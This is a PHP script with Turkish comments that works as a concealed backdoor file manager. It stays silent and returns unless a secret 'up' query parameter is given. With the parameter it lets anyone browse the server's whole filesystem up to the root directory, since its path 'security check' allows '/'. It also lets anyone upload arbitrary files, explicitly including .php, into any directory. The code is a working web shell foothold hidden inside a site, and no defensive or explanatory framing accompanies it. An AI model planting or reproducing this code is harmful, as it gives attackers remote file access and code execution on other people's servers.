<?php
// Hangi dizinde olduğumuzu belirliyoruz
$root = __DIR__; // PHP dosyasının bulunduğu dizin
$top_level = '/'; // Sunucunun en üst düzeyi
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;

// Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
if (!isset($_GET['up'])) {
    return; // sayfayı durduruyoruz
}

// Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
if (strpos($current_dir, realpath($root)) !== 0 && strpos($current_dir, realpath($top_level)) !== 0) {
    die('İzin verilmedi!');
}

// Dosya yükleme işlemi
$uploaded_file_path = ''; // Yüklenen dosyanın yolu
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
    // .php uzantılı dosyalar için yüklemeye izin ver
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        $uploaded_file_path = htmlspecialchars($target_file);
        echo 'Dosya başarıyla yüklendi: ' . htmlspecialchars(basename($_FILES['file']['name'])) . '<br>';
        echo 'Yüklenen Dosya Yolu: ' . $uploaded_file_path . '<br>';
    } else {
        echo 'Dosya yüklenemedi!';
    }
}

// Mevcut dizindeki dosyaları ve dizinleri listeliyoruz
$files = scandir($current_dir);

function is_image($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
}

// Dizinlerde gezinme bağlantılarını oluşturma
$navigation_links = [];

// Her dizinde üst dizin bağlantısı ekliyoruz
$parent_dir = dirname($current_dir);
if ($parent_dir !== $current_dir) {
    $navigation_links[] = '<li><a href="?dir=' . urlencode($parent_dir) . '&up=' . urlencode($_GET['up']) . '">.. (Üst Dizin)</a></li>';
}

// Mevcut dizindeki dosya ve dizinler için bağlantılar oluşturma
foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue; // '.' ve '..' dizinlerini atla
    $file_path = $current_dir . '/' . $file;
    if (is_dir($file_path)) {
        // Dizinler için bağlantı oluştur
        $navigation_links[] = '<li><a href="?dir=' . urlencode($file_path) . '&up=' . urlencode($_GET['up']) . '">' . htmlspecialchars($file) . '</a> (Dizin)</li>';
    } else {
        // Dosyalar için bağlantı oluştur
        $icon = is_image($file) ? '<img src="' . htmlspecialchars($file_path) . '" style="width:50px;"/>' : '';
        $navigation_links[] = '<li>' . htmlspecialchars($file) . ' ' . $icon . '</li>';
    }
}

// Site dizinine gitmek için bir bağlantı ekliyoruz
$navigation_links[] = '<li><a href="?dir=' . urlencode($root) . '&up=' . urlencode($_GET['up']) . '">Site Dizinine Git</a></li>';
// Sunucunun en üst dizinine gitmek için bir bağlantı ekliyoruz
$navigation_links[] = '<li><a href="?dir=' . urlencode($top_level) . '&up=' . urlencode($_GET['up']) . '">En Üst Dizinine Git</a></li>';

// Kullanıcıya dosyaları ve dizinleri gösterme
echo "<h2>Mevcut Dizin: " . htmlspecialchars($current_dir) . "</h2>";
echo "<ul>";
foreach ($navigation_links as $link) {
    echo $link;
}
echo "</ul>";

// Dosya Yükleme Formu
echo '<h2>Dosya Yükle</h2>';
echo '<form action="" method="post" enctype="multipart/form-data">';
echo '<input type="file" name="file" required>'; // Dosya yükleme için gerekli
echo '<input type="submit" value="Yükle">';
echo '</form>';
?>
